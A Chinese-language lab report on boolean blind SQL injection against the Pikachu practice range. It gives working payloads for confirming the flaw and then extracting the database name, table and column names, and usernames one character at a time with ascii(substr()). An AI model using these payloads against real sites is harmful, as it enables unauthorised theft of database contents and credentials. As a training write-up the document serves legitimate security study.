---
title: Pikachu 布尔盲注实验报告
date: 2026-10-29
category: Web安全
tags: [SQL注入, 布尔盲注, Pikachu]
---
## 一、实验环境

靶场：Pikachu
页面：sqli_blind_b.php
注入类型：字符型布尔盲注

## 二、漏洞特点

本页面 没有回显、没有报错，只有两种页面状态：

1. 查询正确 → 显示 yes

2. 查询错误 → 显示 no

因为看不到数据、看不到报错，不能用 union、不能用报错注入。
只能通过页面 yes / no 的布尔变化，一点点猜测数据库内容，所以叫 布尔盲注。

## 三、底层SQL语句
select username from user where username='$name';
• 可控点：$name

• 闭合方式：单引号 '

• 注释符：#

## 四、判断注入是否存在

1. 恒真测试（页面应该 yes）

Payload：
' and 1=1 #
拼接后：
select username from user where username='' and 1=1 #';
页面输出：yes

2. 恒假测试（页面应该 no）

Payload：
' and 1=2 #
页面输出：no

✅ 页面出现明显布尔差异，布尔盲注漏洞成立

## 五、盲注核心原理

数据库不会返回内容，只会告诉你：语句对不对

我们利用三个函数逐字猜数据：

1. length() ：猜长度

2. substr(内容,第几位,取几个) ：截取字符

3. ascii() ：字符转数字，用来大小比较

通过 大于、小于、等于 不断二分，猜出每一个字符。

## 六、实战注入步

1. 猜测数据库名长度

Payload：
' and length(database())>5 #
页面 yes → 库名长度大于5
' and length(database())>8 #
页面 no → 长度不超过8

最后测出：数据库名长度 = 7

2. 逐字猜数据库名（pikachu）

猜第1位字符：
' and ascii(substr(database(),1,1))>110 #
yes
' and ascii(substr(database(),1,1))>112 #
no

得出：第一位 ascii=112 → p

修改 substr 第二个参数，依次猜出：p i k a c h u
最终库名：pikachu

3. 猜表名

Payload模板：
' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #
修改 limit、substr 参数即可爆出所有表。

4. 猜字段名
' and ascii(substr((select column_name from information_schema.columns where table_name='member' limit 0,1),1,1))>100 #
5. 猜账号密码数据
' and ascii(substr((select username from member limit 0,1),1,1))>100 #


